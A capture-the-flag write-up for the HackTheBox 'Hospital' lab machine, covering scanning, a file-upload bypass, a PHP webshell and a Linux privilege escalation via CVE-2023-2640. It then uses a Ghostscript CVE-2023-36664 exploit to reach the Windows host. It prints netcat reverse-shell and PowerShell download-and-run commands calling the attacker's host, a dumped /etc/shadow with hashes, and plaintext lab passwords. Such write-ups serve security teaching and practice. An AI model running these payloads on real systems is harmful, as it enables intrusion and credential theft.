# HackTheBox Hospital Writeup
## Nmap
```bash
Nmap scan report for 10.10.11.241
Host is up, received user-set (0.017s latency).
Scanned at 2024-02-20 08:37:13 +08 for 366s
Not shown: 65506 filtered tcp ports (no-response)
PORT      STATE SERVICE           REASON          VERSION
22/tcp    open  ssh               syn-ack ttl 62  OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
53/tcp    open  domain            syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-02-20 07:38:50Z)
135/tcp   open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
443/tcp   open  ssl/http          syn-ack ttl 127 Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
445/tcp   open  microsoft-ds?     syn-ack ttl 127
464/tcp   open  kpasswd5?         syn-ack ttl 127
593/tcp   open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack ttl 127
1801/tcp  open  msmq?             syn-ack ttl 127
2103/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
2105/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
2107/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
2179/tcp  open  vmrdp?            syn-ack ttl 127
3268/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 127
3389/tcp  open  ms-wbt-server     syn-ack ttl 127 Microsoft Terminal Services
5985/tcp  open  http              syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
6404/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
6406/tcp  open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
6407/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
6411/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
6616/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
6638/tcp  open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
8080/tcp  open  http              syn-ack ttl 62  Apache httpd 2.4.55 ((Ubuntu))
9389/tcp  open  mc-nmf            syn-ack ttl 127 .NET Message Framing
32375/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
```

### Dirbuster on port 8080
```
http://10.10.11.241:8080/config.php           (Status: 200) [Size: 0]
http://10.10.11.241:8080/css                  (Status: 403) [Size: 279]
http://10.10.11.241:8080/failed.php           (Status: 200) [Size: 3508]
http://10.10.11.241:8080/fonts                (Status: 403) [Size: 279]
http://10.10.11.241:8080/images               (Status: 403) [Size: 279]
http://10.10.11.241:8080/index.php            (Status: 200) [Size: 5739]
http://10.10.11.241:8080/js                   (Status: 403) [Size: 279]
http://10.10.11.241:8080/login.php            (Status: 200) [Size: 5739]
http://10.10.11.241:8080/logout.php           (Status: 200) [Size: 5739]
http://10.10.11.241:8080/register.php         (Status: 200) [Size: 5125]
http://10.10.11.241:8080/server-status        (Status: 403) [Size: 279]
http://10.10.11.241:8080/success.php          (Status: 200) [Size: 3536]
http://10.10.11.241:8080/upload.php           (Status: 200) [Size: 0]
http://10.10.11.241:8080/uploads              (Status: 403) [Size: 279]
http://10.10.11.241:8080/vendor               (Status: 403) [Size: 279]
```

### Port 8080 Unrestricted file upload
```
1. Register a user.
2. Try to upload a file.
3. File with .php extension got blocked.
4. Enumerate available extension with burp intruder.
```
![Intruder](https://github.com/ngohuiann/CTF-Write-Ups/blob/main/image/HTB%20Hospital1.png)

### PHP Reverse Shell
```bash
Assumed this is a windows machine so i wasted time trying to find a Windows PHP shell and upload an exe. Turns out its a linux env =.=
Shell used: https://github.com/WhiteWinterWolf/wwwolf-php-webshell/blob/master/webshell.php
cmd to execute: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.7 1234>/tmp/f

rlwrap nc -lnvp 1234        
retrying local 0.0.0.0:1234 : Address already in use
listening on [any] 1234 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.241] 6598
/bin/sh: 0: can't access tty; job control turned off
$ ls -la
total 28
drwxrwxr-x 2 root     www-data 4096 Feb 20 08:42 .
drwxr-xr-x 8 www-data www-data 4096 Oct 24 21:51 ..
-rw-r--r-- 1 www-data www-data 1760 Feb 19 16:35 .antproxy.php
-rw-r--r-- 1 www-data www-data 7168 Feb 20 08:42 shell.exe
-rw-r--r-- 1 www-data www-data 7499 Feb 20 08:42 shell.phar

www-data@webserver:/var/www/html/uploads$ uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

### CVE-2023-2640
```bash
www-data@webserver:/var/www/html/uploads$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
<share -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
> setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
<python3 -c 'import os;os.setuid(0);os.system("id")'
uid=0(root) gid=33(www-data) groups=33(www-data)

www-data@webserver:/var/www/html/uploads$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cp /bin/bash /var/tmp/bash && chmod 4755 /var/tmp/bash && /var/tmp/bash -p && rm -rf l m u w /var/tmp/bash")'

root@webserver:/tmp# id
id
uid=0(root) gid=33(www-data) groups=33(www-data)

root@webserver:/home/drwilliams# cat /etc/shadow
cat /etc/shadow
root:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::
daemon:*:19462:0:99999:7:::
bin:*:19462:0:99999:7:::
sys:*:19462:0:99999:7:::
sync:*:19462:0:99999:7:::
games:*:19462:0:99999:7:::
man:*:19462:0:99999:7:::
lp:*:19462:0:99999:7:::
mail:*:19462:0:99999:7:::
news:*:19462:0:99999:7:::
uucp:*:19462:0:99999:7:::
proxy:*:19462:0:99999:7:::
www-data:*:19462:0:99999:7:::
backup:*:19462:0:99999:7:::
list:*:19462:0:99999:7:::
irc:*:19462:0:99999:7:::
_apt:*:19462:0:99999:7:::
nobody:*:19462:0:99999:7:::
systemd-network:!*:19462::::::
systemd-timesync:!*:19462::::::
messagebus:!:19462::::::
systemd-resolve:!*:19462::::::
pollinate:!:19462::::::
sshd:!:19462::::::
syslog:!:19462::::::
uuidd:!:19462::::::
tcpdump:!:19462::::::
tss:!:19462::::::
landscape:!:19462::::::
fwupd-refresh:!:19462::::::
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
lxd:!:19612::::::
mysql:!:19620::::::
```

## Port 443
```bash
# https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection
python3 CVE_2023_36664_exploit.py -f file.eps -p "powershell.exe -nop -ep bypass -c \"iex ((New-Object Net.WebClient).DownloadString('http://10.10.14.3:80/Invoke-PowerShellTcp.ps1'));Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 1234\"" -g -x eps
[+] Generated EPS payload file: file.eps.eps

Send file.eps.eps as attachment after login as drwilliams
```

## User Flag
```powershell
rlwrap nc -lnvp 1234
listening on [any] 1234 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.241] 31647
Windows PowerShell running as user drbrown on DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Users\drbrown.HOSPITAL\Documents>whoami
hospital\drbrown

PS C:\Users\drbrown.HOSPITAL> cd Desktop
PS C:\Users\drbrown.HOSPITAL\Desktop> dir
    Directory: C:\Users\drbrown.HOSPITAL\Desktop
Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-ar---        2/20/2024   1:07 AM             34 user.txt

C:\Users\drbrown.HOSPITAL\documents> type ghostscript.bat
@echo off
set filename=%~1
powershell -command "$p = convertto-securestring 'chr!$br0wn' -asplain -force;$c = new-object system.management.automation.pscredential('hospital\drbrown', $p);Invoke-Command -ComputerName dc -Credential $c -ScriptBlock { cmd.exe /c "C:\Program` Files\gs\gs10.01.1\bin\gswin64c.exe" -dNOSAFER "C:\Users\drbrown.HOSPITAL\Downloads\%filename%" }"
```

## Root Flag
```bash
rdesktop -u drbrown 10.10.11.241

After login, it can be seen that the administrator password is being typed into the website.
Save the credential (Th3B3stH0sp1t4l9786!) with the browser's autocomplete function and login to administrator through remote desktop with that password.
```
